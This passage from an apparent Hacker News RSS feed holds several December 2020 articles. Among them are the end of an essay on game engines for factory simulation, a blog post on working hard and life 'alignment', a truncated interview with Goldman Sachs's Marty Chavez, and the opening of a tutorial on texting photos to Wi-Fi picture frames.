<li><a href="#developers--users">Developers &amp; Users</a></li>
<li><a href="#scalability">Scalability</a></li>
<li><a href="#photorealism">Photorealism</a></li>
<li><a href="#ai-machine-learning">AI, machine learning</a></li>
</ul>
<p>We'll see at the end whether these features add up to <a href="#disruptive-innovation">Disruptive Innovation</a>.</p>
<h2 id="backgrounder">Backgrounder</h2>
<p>Here we're talking about simulating machines and robots for factory automation that can be connected to an actual controller (PLC, robot) that will run in production. And we are only talking about discrete manufacturing. If you'd like more background information on this topic, see:</p>
<ul>
<li><a href="https://simftw.com/Article01.html">What is factory simulation?</a></li>
<li><a href="https://simftw.com/Article02.html">Options for factory simulation</a></li>
</ul>
<h2 id="funding">Funding</h2>
<p>Of all the platforms mentioned in <a href="https://simftw.com/Article02.html">Options for factory simulation</a> game engines (<a href="https://unity.com/" target="_blank">Unity</a>, <a href="https://www.unrealengine.com/" target="_blank">Unreal Engine</a>) are the most well capitalized. For instance, as of this writing: </p>
<ul>
<li>Unity (NYSE: <a href="https://ca.finance.yahoo.com/quote/U" target="_blank">U</a>) <strong>$41B</strong> market capitalization</li>
<li>Rockwell Automation (NYSE: <a href="https://ca.finance.yahoo.com/quote/ROK" target="_blank">ROK</a>) <strong>$29B</strong> market capitalization</li>
</ul>
<p>Neither of these companies are entirely focused on industrial simulation, but most of the investment Unity puts into its product will end up being valuable for simulation. Compare the small portion of Rockwell that is focused on simulation and it looks like Unity will have a significant advantage. </p>
<p>Unreal creates some of the <a href="https://www.epicgames.com/fortnite/en-US/home" target="_blank">most popular games</a> in the world and has millions in revenue and was recently <a href="https://www.wsj.com/articles/fortnite-creator-epic-games-valued-at-nearly-15-billion-1540577025" target="_blank">valued at $15B</a> USD. </p>
<p><img src="https://simftw.com/media/img/epic-val.PNG" alt="epic"></p>
<p>Any simulation package targeted only at industrial simulation is going to have trouble competing if their core functionality (say, robot programming) starts being migrated to the game engine platforms by 3rd parties. </p>
<h2 id="ecosystem">Ecosystem</h2>
<p>Both game engines have marketplaces, tutorials, YouTubers, conferences and more. If you are trying to build something, you'll more likely find help easily online than from an industrial software package support team.</p>
<h2 id="developers--users">Developers &amp; Users</h2>
<p>Because both packages are free to start, the number of students and hobbyists learning these packages is huge. Industrial packages are priced in the (tens of) thousands per seat which is a huge barrier to entry. Also, the aura of video games just makes learning these tools seem fun.</p>
<p>And as <a href="https://a16z.com/2011/08/20/why-software-is-eating-the-world/" target="_blank">software eats the world</a>, the game engine is the ideal environment to develop a simulation. It allows all the best coding practices, specifically:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Unit_testing#:~:text=Unit%20tests%20are%20typically%20automated,an%20individual%20function%20or%20procedure." target="_blank">Unit testing</a></li>
<li><a href="https://en.wikipedia.org/wiki/Version_control" target="_blank">Version control</a></li>
<li><a href="https://en.wikipedia.org/wiki/CI/CD" target="_blank">CI/CD</a></li>
<li><a href="https://en.wikipedia.org/wiki/Integrated_development_environment" target="_blank">IDE</a></li>
</ul>
<p>By comparison, many of the sim packages utilize scripting languages and store the code base as binaries along with the graphics files, etc. It makes it very difficult to utilize any of the above. And as the simulation becomes the source of truth for the machine being built, proper tracking of code will become very important.</p>
<h2 id="scalability">Scalability</h2>
<p>Video games are huge and complex. The investment in game engines to make developing these games easier will allow factory system simulations to benefit. They will enable both small scale physics-based simulations (loose parts in a bin, bowl feeders) and large scale material flow simulations. The key being that they accommodate both: you can drop the bowl feeder into the material flow sim. Other platforms may have trouble achieving this breadth and depth.</p>
<h2 id="photorealism">Photorealism</h2>
<p>Game engines are being used for <a href="https://www.unrealengine.com/en-US/industry/film-television" target="_blank">movies</a>, <a href="https://www.unrealengine.com/en-US/blog/forging-new-paths-for-filmmakers-on-the-mandalorian" target="_blank">TV</a> and <a href="https://unity.com/ray-tracing" target="_blank">product demos</a>. While this technology (from NVidia and others) will be used by many, game engines will be able to invest more into integrating the technology because they have multiple revenue sources to support it. </p>
<p>But, besides looking nice, why would you need photorealism? <a href="https://en.wikipedia.org/wiki/Machine_vision" target="_blank">Machine vision</a>. Seeing parts, barcodes, etc. is already very important for quality inspections and will become more so for vision guided robotics and more.</p>
<h2 id="ai-machine-learning">AI, machine learning</h2>
<p>Game engines are already being used to <a href="https://unity.com/solutions/automotive-transportation/autonomous-vehicle-training" target="_blank">train self-driving cars</a>. And Unity has <a href="https://unity3d.com/machine-learning" target="_blank">machine learning</a> built in. So, how could this be used in industrial automation? Well, probably many ways, but we'll point out the one way that would require a simulation: it is entirely possible that machines will not need programmers in the future; a goal will be set, a simulation created, and the <a href="https://en.wikipedia.org/wiki/Artificial_neural_network" target="_blank">neural network</a> will create the program. Tesla's head of AI states this is being done already and calls it <a href="https://youtu.be/y57wwucbXR8?t=217" target="_blank">Software 2.0</a>. While this is still a ways off, there are other applications for machine learning in conjunction with machine vision and robotics.</p>
<h2 id="disruptive-innovation">Disruptive Innovation</h2>
<p>This phrase was coined by <a href="https://en.wikipedia.org/wiki/Clayton_Christensen" target="_blank">Clayton Christensen</a> in his 1997 book <em><a href="https://en.wikipedia.org/wiki/The_Innovator%27s_Dilemma" target="_blank">The Innovator's Dilemma</a></em>. Does it apply here? Consider the expensive "industrial" or "enterprise" products that the industrial incumbents (Kuka, Siemens, Rockwell) offer while reviewing these <a href="https://online.hbs.edu/blog/post/4-keys-to-understanding-clayton-christensens-theory-of-disruptive-innovation" target="_blank">key points</a>:</p>
<blockquote>
<ol>
<li>Incumbent businesses innovate and develop their products or services in order to appeal to their most demanding and/or profitable customers, ignoring the needs of those downmarket.</li>
<li>Entrants target this ignored market segment and gain traction by meeting their needs at a reduced cost compared to what is offered by the incumbent.</li>
<li>Incumbents don’t respond to the new entrant, continuing to focus on their more profitable segments.</li>
<li>Entrants eventually move upmarket by offering solutions that appeal to the incumbent’s “mainstream” customers.
Once the new entrant has begun to attract the incumbent business’s mainstream customers en masse, disruption has occurred.</li>
</ol>
</blockquote>
<p>The game engines have already started moving into other spaces beyond video games. Industrial simulations are already being created by people who understand how to do this. It won't be long before there are polished products (either built with game engines or based within them). A few examples of companies building products within Unity:</p>
<ul>
<li><a href="https://www.scopear.com/" target="_blank">ScopeAR</a></li>
<li><a href="https://prespective-software.com/" target="_blank">Prespective</a></li>
<li><a href="https://formant.io/news-and-blog/2019/10/09/analytics/robots-are-hard-game-engines-are-not-why-we-built-our-own-simulator-using-unity/" target="_blank">Formant</a></li>
</ul>
<h2 id="wrap-up">Wrap up</h2>
<p>So, we're taking some guesses about the future here and asking people to do some lateral thinking and choose the best technology even though it's not yet ready for their industry. The best tech doesn't always win but the extreme funding and performance of the game engines gives them a huge advantage. </p>
<p>Why are they better for your company today? We'll try to answer that in the next article: </p>
<ul>
<li><a href="https://simftw.com/Article05.html">Can sim pay for itself?</a></li>
</ul>
<p>Read more: </p>
<ul>
<li><a href="https://simftw.com/Article01.html">What is factory simulation?</a></li>
<li><a href="https://simftw.com/Article02.html">Options for factory simulation</a></li>
<li><a href="https://simftw.com/Article03.html">Why use simulation?</a></li>
<li><a href="https://simftw.com/Article04.html">Why game engines will win factory simulation</a></li>
<li><a href="https://simftw.com/Article05.html">Can sim pay for itself?</a></li>
</ul>
</section>
</div></div>]]>
            </description>
            <link>https://simftw.com/Article04.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507698</guid>
            <pubDate>Tue, 22 Dec 2020 16:10:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Normie Test]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25507654">thread link</a>) | @krebs_liebhaber
<br/>
December 22, 2020 | http://dulm.blue/normie/ | <a href="https://web.archive.org/web/*/http://dulm.blue/normie/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://dulm.blue/normie/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507654</guid>
            <pubDate>Tue, 22 Dec 2020 16:07:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Startup Valuation Nest – Check startup valuations in your industry]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25507578">thread link</a>) | @scherbak
<br/>
December 22, 2020 | https://unicorn-nest.com/valuation/ | <a href="https://web.archive.org/web/*/https://unicorn-nest.com/valuation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><p>Pick your stage and industry to see the <b>average startup valuation</b> in your vertical and how it changed since 2015,<br> check the <b>revenue to valuation multiplier</b>, and get a <b>list of top investors</b> in similar rounds.</p></div></div><div><div> <p><label>  </label> <label>  </label> <a href="" id="valuation_filter">Check valuation</a></p><p>Please pick both the stage and the industry to see the result.</p></div></div></section><section><div><div><p>Historic average valuations of <span id="seed_title"></span> rounds <span id="industry_title"></span> since 2015</p></div></div></section><section><div><div><p>Current revenue to valuation multiplier</p><div><p>Multiplier for <br><b>Agriculture</b> is</p><p><span>8.8</span> <span>*</span></p></div><p> * Multiply your annual revenue by the multiplier to check the approximate valuation of your startup. We calculated this number based on the most recent data.</p></div></div></section><section><div><div><p>Top 5 most active industry investors since 2015</p><div><table><thead><tr><th>Fund</th><th># of investments in<br> the vertical</th><th>% of portfolio<br> investments</th><th>Geo investment<br> focus</th><th>Headquarters</th></tr></thead><tbody><tr><td></td></tr></tbody></table><div><div><p>The data about investments is time-sensitive.</p><p>Learn what investors we consider the most relevant for you right now.</p></div></div></div></div></div></section><section><div><div><p>about Startup VAluation Nest</p><p>Unicorn Nest analytics team provides historical data on average startup valuation at the time of investment for <b>55 industry groups since 2015</b>.<br> All the data is based on <b>Unicorn Nest Dataset</b>, the most comprehensive, verified and constantly updated dataset of venture capital investors, startups and deals.</p></div></div></section><section></section></div></div>]]>
            </description>
            <link>https://unicorn-nest.com/valuation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507578</guid>
            <pubDate>Tue, 22 Dec 2020 16:00:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Should you Work Hard? (2019)]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 157 (<a href="https://news.ycombinator.com/item?id=25507413">thread link</a>) | @axiomdata316
<br/>
December 22, 2020 | https://jacobobryant.com/post/2019/alignment/ | <a href="https://web.archive.org/web/*/https://jacobobryant.com/post/2019/alignment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Should you work hard? Depending on your definition of "hard," it's a
<a href="https://twitter.com/elonmusk/status/1067173497909141504" target="_blank">controversial question</a>. Let's assume a
baseline level of hardness is roughly 40 hours per week of mostly focused work.
In other words, this is your typical "good employee" at a 9-to-5: they do their
time and they do good work, then they go home and focus on other things. This
is very respectable.</p><p>What about going above and beyond? There are two sides to this. Bronnie Ware
says that one of the top five <a href="https://bronnieware.com/blog/regrets-of-the-dying/" target="_blank">regrets of the
dying</a> is "I wish I
hadn't worked so hard":</p><blockquote>
<p>This came from every male patient that I nursed. They missed their children's
youth and their partner's companionship. Women also spoke of this regret. But
as most were from an older generation, many of the female patients had not been
breadwinners. All of the men I nursed deeply regretted spending so much of
their lives on the treadmill of a work existence.</p>
</blockquote><p>On the other hand, we can probably all think of several highly successful people
who worked more than 40 hours per week. My favorite example is Henry Eyring, the
chemist. <a href="https://www.goodreads.com/book/show/2300985.Mormon_Scientist" target="_blank">His
biography</a> is one
of the few books I've read twice, and he's one of my personal role models. He
was ambitious, worked extremely hard and achieved a lot—but he did this without
compromising on anything more important. He was a good husband, father, teacher
and leader. He touched the lives of many.</p><p>There are additional arguments for both sides of the debate. But what's the
resolution to this paradox? I think it's something that I've started calling
"alignment." Alignment is the situation in which there's a high correlation
between the effort you put into life and the good that comes out. In other
words, it's when your work is aligned with what's most important.</p><p>I hypothesize that the real problem with many of Bronnie
Ware's patients wasn't that they worked too hard—the problem is that they
worked too hard on things that, at the end of the day, weren't as important to
them as they thought. Notice that the #1 regret was "I wish I'd had the
courage to live a life true to myself, not the life others expected of me."
Perhaps the regret of working too hard was really just a symptom of this deeper
regret.</p><p>If you want to spend your life working really hard, it's critical to mould
yourself and your situation until working hard is actually worth it. Otherwise
you have two bad choices:</p><ul>
<li>Work hard and later regret that you neglected more important things</li>
<li>Don't work hard and later regret that you didn't fulfill your dreams</li>
</ul><p>I really like <a href="http://blog.samaltman.com/how-to-be-successful" target="_blank">Sam Altman's
advice</a> on "how to
achieve outlier success." I think it describes well this idea of alignment:</p><p>(Update since this got on HN and some people are taking issue with part of the quote:
read the whole post, or at least the opening two paragraphs, the footnote, and the
parts of the quote I ellided.)</p><blockquote>
<p>Almost everyone I've ever met would be well-served by spending more time
thinking about what to focus on. It is much more important to work on the right
thing than it is to work many hours. Most people waste most of their time on
stuff that doesn't matter.</p>
<p>Once you have figured out what to do, be unstoppable about getting your small
handful of priorities accomplished quickly. I have yet to meet a slow-moving
person who is very successful. ...</p>
<p>You can get to about the 90th percentile in your field by working either smart
or hard, which is still a great accomplishment. But getting to the 99th
percentile requires both.... Working a lot comes with huge life trade-offs,
and it's perfectly rational to decide not to do it. But it has a lot of
advantages. ... And it's often really fun. One of the great joys in life is
finding your purpose, excelling at it, and discovering that your impact
matters to something larger than yourself.</p>
<p>It's not entirely clear to me why working hard has become a Bad Thing in
certain parts of the US.... I think people who pretend you can be super
successful professionally without working most of the time (for some period of
your life) are doing a disservice.</p>
<p>One more thought about working hard: do it at the beginning of your career. Hard
work compounds like interest, and the earlier you do it, the more time you have
for the benefits to pay off.</p>
</blockquote><p>I've had several different experiences with alignment over the past six years:</p><ul>
<li>
<p>For a large, early chunk of my mission, I was completely out of alignment.
I didn't enjoy being a missionary at all—it was a living hell—and it seemed
like our efforts didn't make a difference anyway.</p>
</li>
<li>
<p>I changed a lot partway through my mission. One of the things I most enjoyed
about the end of my mission was the satisfaction of working hard all day, every
day on something that mattered.</p>
</li>
<li>
<p>Although my experience at BYU was positive overall, there was lots of
pressure from the system to work very hard, even though a large chunk of my
time was spent on things that didn't contribute to my education (this
category includes a lot of homework, most lectures, and almost all exams).</p>
</li>
<li>
<p>Being an employee was alright. I went in with the desire to make a real
contribution to Lucid and I like to think I achieved that goal. Although it
wasn't the work I wanted to spend the rest of my life on, I did learn a lot
and the money I saved up is a great benefit to me now.</p>
</li>
<li>
<p>Now that I've quit my job and have become a startup founder, it's
the first time since my mission where
I feel that I have perfect alignment. I work a
lot, but it doesn't feel like work. I don't look forward to the weekends
anymore; I love every day. Things will get more stressful as we progress, but
I'm excited.</p>
</li>
</ul><p>For me, having alignment means being a startup founder because I'm ambitious and
there are specific things I want to build—I'm not satisfied by working on
whatever the company that hired me happens to be building. But all that being
said, alignment is important for everyone, regardless of what your individual
goals and desires are. As with most <a href="https://www.goodreads.com/book/show/18176747-the-hard-thing-about-hard-things" target="_blank">hard
things</a>,
there's no formula for alignment. You have to figure out what it means for you
and how to get it. But being aware of the concept is at least the first step.</p><p>I write this all as a reminder to myself. I hope my life never falls out
of alignment.</p></div></div>]]>
            </description>
            <link>https://jacobobryant.com/post/2019/alignment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507413</guid>
            <pubDate>Tue, 22 Dec 2020 15:48:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA['We haven't done a great job' explaining why Goldman is 'good for the planet']]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25507133">thread link</a>) | @smalera
<br/>
December 22, 2020 | https://www.businessofbusiness.com/articles/goldman-sachs-marty-chavez-interview/ | <a href="https://web.archive.org/web/*/https://www.businessofbusiness.com/articles/goldman-sachs-marty-chavez-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-section">
    <!-- .sidebar -->

    <section>
      
      

      <p><b></b><i><span></span></i><span>This month, former Goldman Sachs CIO, CFO, and Global Co-Head of Securities Marty Chavez sat down with the co-founder and CEO of The Business of Business and Thinknum Alternative Data, Gregory Ugwi.</span><span>&nbsp;The two discussed a broad range of topics, from Marty’s time at Goldman Sachs to his views on universal basic income, alcoholism, and workplace diversity.&nbsp;</span></p>
<p><span>Marty Chavez’s career lies right on the intersection of finance and technology. Chavez pioneered the integration of computer engineering into Goldman’s business model as a way to bring the bank’s trading model into the 21st century.&nbsp;</span></p>
<p><span>A computer engineer himself, Chavez started out at Goldman’s J. Aron Currency and Commodities Division back in 1993, where he worked as a senior energy strategist, or “strat” in Goldman speak. After a three-year stint with Credit Suisse, Chavez founded Kiodex, a web-based risk management company, where he served as chairman and CEO until his return to Goldman in 2005. And as Marty explains in the fireside chat, his pride prevented him from returning to the bank earlier. Then again, he added, he wouldn’t have found the initiative to get his startup off the ground if he’d stayed.&nbsp;</span></p>
<p><span>Despite his illustrious career, Chavez isn’t your typical bank exec —&nbsp;he’s Latino, openly gay, and far more open to the media than most who have worked at Goldman Sachs. As the most senior openly gay employee at the bank, Chavez arguably set an example for diversity in Wall Street. Last year, however, Chavez announced his retirement after 19 years with the bank.</span></p>
<p><iframe allowfullscreen="allowfullscreen" height="315" src="https://www.youtube.com/embed/m_2dZptn3fc" width="560"></iframe></p>
<p><span>Here’s the full transcript of the chat.</span></p>
<p><b>Gregory Ugwi: Welcome, Marty.&nbsp;</b></p>
<p><b>Marty Chavez:</b><span> Gregory, how are you?</span></p>
<p><b>Gregory Ugwi: Very well. The first question I'd like to start with would be SecDB. How did you begin to build that? Assuming today you had to take on such a challenge, how would you prepare? How would you learn to build something like that?&nbsp;</b></p>
<p><b>Marty Chavez:</b><span> You know secDB too, so you can assess for yourself whether it's led us up to the Wall Street Journal's billing or not. I'll tell you about how it showed up for me. I never planned a career in finance, never even occurred to me. Most of my college class, I'm in the class of '85, a lot of people went to Wall Street. The '87 crash happened, and then they went and did other things.&nbsp;</span></p>
<p><span>I basically don't know anybody from the class of '85 who's on Wall Street, but for me it was just a freak occurrence. I was in an MD PhD program and I was dissecting cadavers while the stock market crash happened, so I had other problems. Then just out of the blue, I got a letter from a headhunter, and this is in the days well before LinkedIn, where he had done some work. Armen, who you all know from Goldman, Armen Avanessians had told this headhunter, and this is 1993, "I want you to make a list of entrepreneurs in Silicon Valley with PhDs from Stanford in computer science." I was just on the list.&nbsp;</span></p>
<p><span>How do I know that? Well, because my officemate, who shared a little cubicle with me, who's vastly more successful, got the same letter. He and I were both working on machine learning, we were both really depressed because the compute power was too low. We were looking for other things. He had the bright idea of applying machine learning to help people figure out what movie to watch. And of course my office mate was Reed Hastings, founder of Netflix.&nbsp;</span></p>
<p><span>Anyway, I went to Goldman. I joined this crazy group of three people who had this ambition of building a single piece of software where you could put all the trades, all the time series, all the models, all the risks, all the reports for Goldman Sachs. Which was a crazy aspiration because we barely had the buy-in for the foreign exchange business, barely.&nbsp;</span></p>
<p><span>Armen would tell us, "Just pretend you're doing things for the foreign exchange business, but you're actually going to be building this core infrastructure that's going to be so powerful, it's going to let us ask counterfactual questions like what if dollar-yen were here. But if interest rates were there, and it's going to tell us the answer, and that's going to give us an edge. " That was Armen's vision and we were executing on it.&nbsp;</span></p>
<blockquote>
<h2><i><span>“Look around and make promises to important people that are going to make their lives better, and then deliver on that. I've found if you do that, that's the best marketing.” - Marty Chavez</span></i></h2>
</blockquote>
<p><span>So I arrive at Goldman and they say, "Would you please write an object-oriented transaction-protected distributed database in C from scratch?" I thought that was completely crazy. I don't know, I was fortunate or unfortunate. I took a lot of computer science classes, basically absolutely every topic, except databases. Maybe if I'd taken a database course I would have known what a quixotic ambition it was to do this, but I didn't know any better. That became the server for secDB.</span></p>
<p><span>Nowadays, and this gets to your question, Gregory, we would recognize what the team built as DynamoDB, it's very similar to Amazon Web Service's DynamoDB, but it didn't exist in '93, so we wrote it. We needed a scripting language where people on the trading desk could ask questions and get answers and do numerical analysis. There was no Java, there was no Python, there was nothing, so we wrote something called Slang. Again and again, we wrote all this stuff that just didn't exist. If I were doing it now, it's an amazing time to start this now. I was thinking about dependency graphs, so I found a beautiful dependency graph, open source package in Julia that does way more than what we ever did with SecDB. It's amazing that you can now build on top of open source at an abstraction level — it’s just light years beyond what we had in '93. Now it really becomes a software stack selection problem, which is hard in its own right.&nbsp;</span></p>
<p><b>Gregory Ugwi: When I go through your resume and you talk about secDB, and then Slang, and then you just keep going, it does seem like you just had success after success. Was there any point in your career where you failed?&nbsp;</b></p>
<p><b>Marty Chavez:</b><span> Oh, yeah. Absolutely. So it's biased, you’ll see more if you Google me. Be careful about anything you read on the internet. More is written on the things that worked well than the things that didn't, I don't know why. I learned a lot more from the things that didn't work well. As an example, your roommate mentioned Kiodex. Was it a success, was it a failure? It failed, and then it didn't make me billions of dollars, but it succeeded in that it was one of a tiny handful, maybe 1%, of software companies founded in 2000 that returned money to investors. Almost everything was a complete flameout from that vantage, why? Because they raised money at the height of the dot-com bubble. So I don't know, are we in a bubble now? Who knows. But here's what I learned from that experience: don't believe any hype, especially your own, and certainly not the market hype.&nbsp;</span></p>
<p><span>When I started that company with almost no effort, I raised $15 million practically overnight. It was straight downhill from there. That was the high point of the company, because the dot-com bubble burst a week after I raised that money and it became almost impossible for the next four years to raise any money at any terms. Yet why do I think of it as a success? Well, it was because we returned money to investors, and my co-founders and I all went on to do interesting things. One of them is a senior partner at Goldman, another one is a US Congressman from the State of New York, another went on to become president of the New York Stock Exchange. We all did interesting stuff and Kiodex really got us going.&nbsp;</span></p>
<p><span>Why it was especially valuable is that we had raised some money, and we had to build some software that got to cash flow break even with real cash paid by real customers who had the unbearable pain that only we could solve. All the hype went away, and we just had the hard reality of selling subscription enterprise software in a time when no one had heard of the term SaaS — the term SaaS did not exist. We had to invent all of that and invent all the software, and the software had to work and it had to be on time and on budget. That terrible ruthless discipline was what I brought with me when I rejoined Goldman Sachs after Kiodex. I had the opportunity, and you were the victim of it, to apply that kind of ruthless methodology of getting software done on time at the scale of Goldman Sachs. So that's something I learned immensely from. I learned how to sell enterprise software. I would say I learned more lessons from that.&nbsp;</span></p>
<blockquote>
<h2><i><span>“When it's your ego talking, it's almost always causing you to make poor choices. Well, I think it is [about] having friends and people who love you who help you calibrate to reality.” - Marty Chavez</span></i></h2>
</blockquote>
<p><span>Then my other lesson was the financial crisis, the collapse of 2008. That was an epic failure in every possible direction for Goldman. It was not a financial failure, but it was a reputational calamity. Digging ourselves out of that and then embracing regulation, which was something where I had a role, where I learned a lot. I was sent out to go explain our business to the regulators and build trust with the regulators at a time when that trust was completely absent. Generally, while the failures were deeply unpleasant, they were really important ingredients of later successes.&nbsp;</span></p>
<p><b>Gregory Ugwi: You hinted at the discipline that you need to have with focusing on value to your customers. How do you balance working on technically interesting problems that might be cutting edge versus more mundane tasks that move the needle commercially?</b></p>
<p><b>Marty Chavez:</b><span> I don't know if I'm the best person to answer that. I tend to have ideas that are sound with timing that is questionable, and you really need both. You can have a great idea that's too early. When I look back with the investors in Kiodex and we ask ourselves, "With perfect hindsight, what would we have done differently?" Our answer is we would have started five years later. That would …</span></p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.businessofbusiness.com/articles/goldman-sachs-marty-chavez-interview/">https://www.businessofbusiness.com/articles/goldman-sachs-marty-chavez-interview/</a></em></p>]]>
            </description>
            <link>https://www.businessofbusiness.com/articles/goldman-sachs-marty-chavez-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507133</guid>
            <pubDate>Tue, 22 Dec 2020 15:29:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Our Family Used SMS / WiFi Picture Frames to Connect During Remote Holidays]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25507078">thread link</a>) | @mjclemente
<br/>
December 22, 2020 | https://blog.mattclemente.com/2020/12/22/sharing-pictures-sms-smart-frame.html | <a href="https://web.archive.org/web/*/https://blog.mattclemente.com/2020/12/22/sharing-pictures-sms-smart-frame.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>22 Dec 2020</span></p><p>Two days before Thanksgiving, I decided to put together a simple way for our family to share pictures, because we couldn’t be together in person. The idea: smart photo frames that everyone could text pictures to. Here’s how I got it working.
<!--more--></p>

<p><strong>tldr;</strong> A <a href="https://pipedream.com/@mjclemente/sms-pictures-to-email-p_wOCgyw1">Pipedream workflow</a> parses SMS messages sent to a Twilio phone number, extracting the pictures and then using SendGrid to email them to the dedicated email addresses used by our Pix-Star photo frames.</p>

<ul id="markdown-toc">
  <li><a href="#background" id="markdown-toc-background">Background</a></li>
  <li><a href="#the-goal" id="markdown-toc-the-goal">The Goal</a></li>
  <li><a href="#prerequisites" id="markdown-toc-prerequisites">Prerequisites</a></li>
  <li><a href="#setting-up-the-workflow" id="markdown-toc-setting-up-the-workflow">Setting Up the Workflow</a>    <ul>
      <li><a href="#pix-star-frames-setup" id="markdown-toc-pix-star-frames-setup">Pix-Star Frames Setup</a></li>
      <li><a href="#twilio-phone-number" id="markdown-toc-twilio-phone-number">Twilio Phone number</a></li>
      <li><a href="#pipedream-workflow" id="markdown-toc-pipedream-workflow">Pipedream Workflow</a></li>
    </ul>
  </li>
  <li><a href="#problems-and-limitations" id="markdown-toc-problems-and-limitations">Problems and Limitations</a></li>
  <li><a href="#wrapping-it-up" id="markdown-toc-wrapping-it-up">Wrapping it up</a></li>
</ul>
<h2 id="background">Background</h2>

<p>I come from a large family and while we’re scattered across the country, most of us usually make it home for Thanksgiving. Not this year, thanks to COVID.</p>

<p>So, I was looking for something to connect four generations of people with wildly differing degrees of technological savviness and engagement. Some use Android, others iOs; some are on social media, others aren’t. And I have no idea what the cool kids are using to share photos now.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<p>Text messages (SMS) seemed like the best candidate to bridge the platform/technology divide. But just sharing images in a group chat would be really disruptive on a holiday - phones buzzing non-stop, everyone constantly looking down at them. Digital photo frames, silently updating to include the latest pictures, appeared a promising solution, though I’d never used one before.</p>

<h2 id="the-goal">The Goal</h2>

<p>Here’s the setup I was aiming for:</p>

<ul>
  <li>Every household gets a picture frame.</li>
  <li>A phone number is shared with everyone. This is the “Shared Photos” number.</li>
  <li>Pictures texted to the Shared Photos number show up on all the frames automatically.</li>
  <li>Everyone enjoys their day, occasionally stopping to see the new pictures that others have shared.</li>
</ul>

<p>The problem to be solved, then, was how to get the pictures from the text messages to the frames.</p>

<p>While the resulting flow is far from perfect (see the <a href="#problems-and-limitations">shortcomings</a> below), our family genuinely enjoyed using it, finding new pictures on the frames to be an ongoing source of delight throughout the day (and afterward).</p>

<h2 id="prerequisites">Prerequisites</h2>

<p>Here’s what’s needed to get this picture-sharing process up and running:</p>

<ul>
  <li><strong>Wifi-enabled picture frames</strong>:<br>
  It seems that wifi picture frames are still fairly novel; there are a handful of options on Amazon, with varying degrees of credibility and functionality. I didn’t have a lot of time to do research, so at the <a href="https://www.tomsguide.com/best-picks/best-digital-photo-frames">recommendation of Tom’s Guide</a>, I went with <a href="https://www.pix-star.com/">Pix-Star photo frames</a>,  as it was clear that I could at least email photos to them.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Twilio account with phone number</strong>:<br>
  No surprise here; Twilio handles the SMS portion of the workflow. You’ll need a paid account, so that you can <a href="https://support.twilio.com/hc/en-us/articles/223135247-How-to-Search-for-and-Buy-a-Twilio-Phone-Number-from-Console">buy a number</a> (it seems that most cost about $1/month); don’t forget to make sure that the number supports SMS and MMS. There’s no need to configure it yet; that will happen automatically when we add it as a source in Pipedream.</li>
  <li><strong>SendGrid account</strong>:<br>
  You could really use any API based email provider here. SendGrid has a free tier that includes up to 100 emails a day, which should be sufficient for a lot of family-image sharing purposes.</li>
  <li><strong>Pipedream account</strong>:<br>
  I’ve <a href="https://blog.mattclemente.com/2020/09/06/pipedream-uptime-monitoring.html#some-pipedream-context">written about Pipedream</a> before. It’s a developer-friendly service (with a generous free tier). In this case, Pipedream is what makes the whole picture-sharing workflow possible, because it’s where we’ll write the SMS-to-email translation.</li>
</ul>

<h2 id="setting-up-the-workflow">Setting Up the Workflow</h2>

<h3 id="pix-star-frames-setup">Pix-Star Frames Setup</h3>

<p>The first thing you’ll need to do is set up the picture frames. I had the them shipped to family members, who then sent me the frame serial numbers, which I needed to set up the accounts with Pix-Star.</p>

<p>I don’t want to get too far into the weeds with the Pix-Star frame setup, but there are some important points to cover:</p>

<ul>
  <li>Each frame gets its own account with Pix-Star, and the first step in setting up an account is picking the frame’s email address. These email addresses are the key to sending emails to the frames.</li>
  <li>You can manage a group of frames via a multi-frame account. More info on that <a href="https://pixstar.uservoice.com/knowledgebase/articles/217397-how-can-i-manage-several-pix-star-frames-from-one">here</a>. It’s not necessary, but it is convenient.</li>
  <li>In order to send pictures to all the frames, you’ll need either a multi-frame account email address (example.group@mypixstar.com) or the email addresses of all the individual frames.</li>
  <li>The frames should be configured to accept new pictures automatically and their slideshows switched to “Play the Inbox Photos” (that is, the ones they receive via email). These updates can be made via the web and don’t require access to the frames.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
</ul>

<h3 id="twilio-phone-number">Twilio Phone number</h3>

<p>Twilio provides a <a href="https://support.twilio.com/hc/en-us/articles/223135247-How-to-Search-for-and-Buy-a-Twilio-Phone-Number-from-Console">guide for buying phone numbers</a>, so I won’t retype those instructions here.</p>

<p>I found it helpful to create a contact in my phone associated with the Twilio number for this project (I even added a picture). Having a contact makes it easier to send pictures to the number from your phone’s camera roll, as well as share the number/contact with family members.</p>

<h3 id="pipedream-workflow">Pipedream Workflow</h3>

